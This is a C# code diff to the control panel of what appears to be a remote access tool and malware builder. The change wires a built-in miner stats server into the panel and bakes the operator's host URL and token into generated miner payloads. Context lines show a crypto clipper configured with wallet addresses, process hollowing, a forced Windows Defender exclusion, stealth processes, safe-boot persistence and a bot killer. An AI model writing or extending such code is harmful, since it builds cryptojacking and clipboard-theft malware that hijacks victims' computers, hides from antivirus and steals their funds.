@@ -19,6 +19,7 @@ public partial class ServerWindow : ThemedWindow
 {
     private readonly DataStore _store = new();
     private TlsServer? _server;
+    private Net.MinerStatsHost? _minerStatsHost;
     internal TlsServer? Server => _server;
     internal DataStore Store => _store;
     private DateTime _serverStartedAt;
@@ -26,6 +27,7 @@ public partial class ServerWindow : ThemedWindow
     private readonly DispatcherTimer _uptimeTimer;
     private readonly System.Collections.ObjectModel.ObservableCollection<Data.AutoTaskEntry> _autoTasks = new();
     private Net.SeroDiscordRPC? _discordRpc;
+    private const int MinerStatsPort = 8081;
     // BulkObservableCollection: fires one Reset instead of N individual change events.
     // Prevents DataGrid from refreshing N×N times when thousands of clients connect.
     private sealed class BulkObservableCollection<T> : System.Collections.ObjectModel.ObservableCollection<T>
@@ -848,6 +850,8 @@ public partial class ServerWindow : ThemedWindow
         {
             NotificationService.PlayShutdown();
             _server.Stop();
+            _minerStatsHost?.Stop();
+            _minerStatsHost = null;
             _dashTimer.Stop();
             _uptimeTimer.Stop();
             _discordRpc?.Stop();
@@ -976,6 +980,13 @@ public partial class ServerWindow : ThemedWindow
                 if (int.TryParse(SettingsMaxClients.Text, out int maxClients) && maxClients > 0)
                     _server.MaxConnectedClients = maxClients;
                 _server.Start(port);
+
+                // Start integrated miner stats endpoint
+                var mnrToken = EnsureMinerToken();
+                _minerStatsHost = new Net.MinerStatsHost(MinerStatsPort, mnrToken);
+                try { _minerStatsHost.Start(); Log($"[+] Miner stats listening on port {MinerStatsPort}."); }
+                catch (Exception mex) { Log($"[!] Miner stats host failed: {mex.Message}"); }
+
                 NotificationService.PlayStartup();
                 _serverStartedAt = DateTime.UtcNow;
                 // Auto-fill port checker with the active listening port
@@ -2677,7 +2688,7 @@ public partial class ServerWindow : ThemedWindow
             if (cfg.TryGetValue("WnTelegramChatId1", out var wc1)) WnTelegramChatId1.Text = wc1;
             if (cfg.TryGetValue("WnTelegramChatId2", out var wc2)) WnTelegramChatId2.Text = wc2;
             SetWinNotifyKeywordsLocked(WinNotifyEnabled.IsChecked == true);
-            if (cfg.TryGetValue("MnrStatsToken", out var mst) && !string.IsNullOrEmpty(mst)) BldMnrStatsToken.Text = mst;
+            if (cfg.TryGetValue("MnrStatsToken", out var mst) && !string.IsNullOrEmpty(mst)) _mnrStatsToken = mst;
 
             // Crypto Clipper
             if (cfg.TryGetValue("ClipperBTC",  out var cBtc))  ClipperBTC.Text  = cBtc;
@@ -2744,7 +2755,7 @@ public partial class ServerWindow : ThemedWindow
                 ["WnTelegramToken"]   = WnTelegramToken.Text.Trim(),
                 ["WnTelegramChatId1"] = WnTelegramChatId1.Text.Trim(),
                 ["WnTelegramChatId2"] = WnTelegramChatId2.Text.Trim(),
-                ["MnrStatsToken"] = BldMnrStatsToken.Text.Trim(),
+                ["MnrStatsToken"] = EnsureMinerToken(),
                 ["ClipperBTC"]  = ClipperBTC.Text.Trim(),
                 ["ClipperETH"]  = ClipperETH.Text.Trim(),
                 ["ClipperLTC"]  = ClipperLTC.Text.Trim(),
@@ -3008,8 +3019,8 @@ internal static class MinerConfig
     public const string HollowTarget     = ""{Esc(BldMnrHollowTarget.Text.Trim())}"";
     public const bool   EnableBotKiller          = {(BldMnrBotKiller.IsChecked == true ? "true" : "false")};
     public const bool   EnableDefenderExclusion  = true;
-    public const string StatsUrl         = ""{Esc(BldMnrStatsUrl.Text.Trim())}"";
-    public const string StatsToken       = ""{Esc(BldMnrStatsToken.Text.Trim())}"";
+    public const string StatsUrl         = ""http://{Esc(GetPrimaryHost())}:{MinerStatsPort}/api/report"";
+    public const string StatsToken       = ""{Esc(EnsureMinerToken())}"";
     public const string SfcSeed          = ""{sfcSeedB64}"";
 }}
 ";
@@ -3344,7 +3355,7 @@ Read-Host 'Press Enter to close'
                 ["IdleSec"]      = BldMnrIdleSec.Text,
                 ["InstallName"]  = BldMnrInstallName.Text,
                 ["StealthProcs"] = BldMnrStealth.IsChecked == true ? "1" : "0",
-                ["StatsToken"]   = BldMnrStatsToken.Text,
+                ["StatsToken"]   = EnsureMinerToken(),
                 ["DisableSleep"]  = BldMnrDisableSleep.IsChecked == true,
                 ["Startup"]      = BldMnrStartup.IsChecked   == true,
                 ["SafeBoot"]        = BldMnrSafeBoot.IsChecked    == true,
@@ -3386,7 +3397,7 @@ Read-Host 'Press Enter to close'
             if (Get("IdleSec")      is string id)    BldMnrIdleSec.Text       = id;
             if (Get("InstallName")  is string ins)   BldMnrInstallName.Text   = ins;
             if (Get("StealthProcs") is string sp)    BldMnrStealth.IsChecked  = sp == "1" || (sp != "0" && sp.Length > 0);
-            if (Get("StatsToken")   is string tok)   BldMnrStatsToken.Text    = tok;
+            if (Get("StatsToken")   is string tok)   _mnrStatsToken           = tok;
             if (Get("HollowTarget") is string ht)    BldMnrHollowTarget.Text  = ht;
             if (GetB("DisableSleep") is bool ds)  BldMnrDisableSleep.IsChecked = ds;
             if (GetB("Startup")     is bool st)  BldMnrStartup.IsChecked   = st;
@@ -4416,67 +4427,27 @@ Read-Host 'Press Enter to close'
         System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo { FileName = url, UseShellExecute = true });
     }
 
-    private void BldMnrStatsLaunch_Click(object sender, RoutedEventArgs e)
+    private string _mnrStatsToken = "";
+
+    private string EnsureMinerToken()
     {
-        var localIp = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()
-            .Where(ni => ni.OperationalStatus == System.Net.NetworkInformation.OperationalStatus.Up)
-            .SelectMany(ni => ni.GetIPProperties().UnicastAddresses)
-            .Where(a => a.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork
-                     && !System.Net.IPAddress.IsLoopback(a.Address)
-                     && a.Address.GetAddressBytes()[0] != 169)
-            .Select(a => a.Address.ToString())
-            .FirstOrDefault() ?? "localhost";
-        BldMnrStatsUrl.Text = $"http://{localIp}:8080/api/report";
+        if (!string.IsNullOrEmpty(_mnrStatsToken)) return _mnrStatsToken;
+        _mnrStatsToken = Convert.ToHexString(
+            System.Security.Cryptography.RandomNumberGenerator.GetBytes(16)).ToLower();
+        return _mnrStatsToken;
+    }
 
-        bool alreadyRunning = System.Diagnostics.Process.GetProcessesByName("StatsServer").Length > 0;
-        if (!alreadyRunning)
+    private void BtnDashMinerStats_Click(object sender, RoutedEventArgs e)
+    {
+        if (_minerStatsHost == null)
         {
-            var exeDir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) ?? "";
-            // Walk up until we find the project root (contains stats-server/)
-            string? projectRoot = null;
-            var dir = new DirectoryInfo(exeDir);
-            while (dir != null)
-            {
-                if (Directory.Exists(Path.Combine(dir.FullName, "stats-server")))
-                { projectRoot = dir.FullName; break; }
-                dir = dir.Parent;
-            }
-
-            string? exe = null;
-            if (projectRoot != null)
-            {
-                var candidates = new[]
-                {
-                    Path.Combine(projectRoot, "stats-server", "publish", "StatsServer.exe"),
-                    Path.Combine(projectRoot, "stats-server", "bin", "Release", "net10.0-windows", "win-x64", "StatsServer.exe"),
-                    Path.Combine(projectRoot, "stats-server", "bin", "Release", "net10.0-windows", "StatsServer.exe"),
-                };
-                exe = candidates.FirstOrDefault(File.Exists);
-                // Fallback: recursive search under stats-server/
-                if (exe == null)
-                {
-                    var ssDir = Path.Combine(projectRoot, "stats-server");
-                    exe = Directory.GetFiles(ssDir, "StatsServer.exe", SearchOption.AllDirectories)
-                                   .OrderByDescending(File.GetLastWriteTime)
-                                   .FirstOrDefault();
-                }
-            }
-
-            if (exe == null) { Log("[!] StatsServer.exe not found — build it first or run start_stats.bat"); }
-            else
-            {
-                var token = BldMnrStatsToken.Text.Trim();
-                var psi = new System.Diagnostics.ProcessStartInfo(exe) { UseShellExecute = true };
-                psi.Arguments = string.IsNullOrEmpty(token) ? "8080" : $"8080 {token}";
-                try { System.Diagnostics.Process.Start(psi); Log($"[+] StatsServer launched: {Path.GetFileName(exe)}"); }
-                catch (Exception ex) { Log($"[!] Cannot launch stats-server: {ex.Message}"); }
-            }
+            System.Windows.MessageBox.Show(
+                Lang.Get("MNR_STATS_NOT_RUNNING"), "Miner Stats",
+                System.Windows.MessageBoxButton.OK, System.Windows.MessageBoxImage.Information);
+            return;
         }
-        else { Log("[*] StatsServer already running."); }
-
-        var dashUrl = $"http://{localIp}:8080/";
-        try { System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(dashUrl) { UseShellExecute = true }); }
-        catch { }
+        var win = new MinerStatsWindow(_minerStatsHost) { Owner = this };
+        win.Show();
     }
 
     // ── BotKiller: send to selected clients on-demand (right-click menu) ──
@@ -7790,6 +7761,7 @@ Read-Host 'Press Enter to close'
         if (DashSubTagged      != null) DashSubTagged.Text      = Lang.Get("DASH_SUB_TAGGED");
         if (DashLblTopCountry  != null) DashLblTopCountry.Text  = Lang.Get("DASH_TOP_COUNTRY");
         if (DashSubTopCountry  != null) DashSubTopCountry.Text  = Lang.Get("DASH_SUB_TOP_COUNTRY");
+        if (BtnDashMinerStatsLbl != null) BtnDashMinerStatsLbl.Text = Lang.Get("DASH_MINER_STATS");
 
         // ── Settings checkboxes ──
         if (SettingsDiscordRPC    != null) SettingsDiscordRPC.Content    = Lang.Get("SETT_CHK_DISCORD");
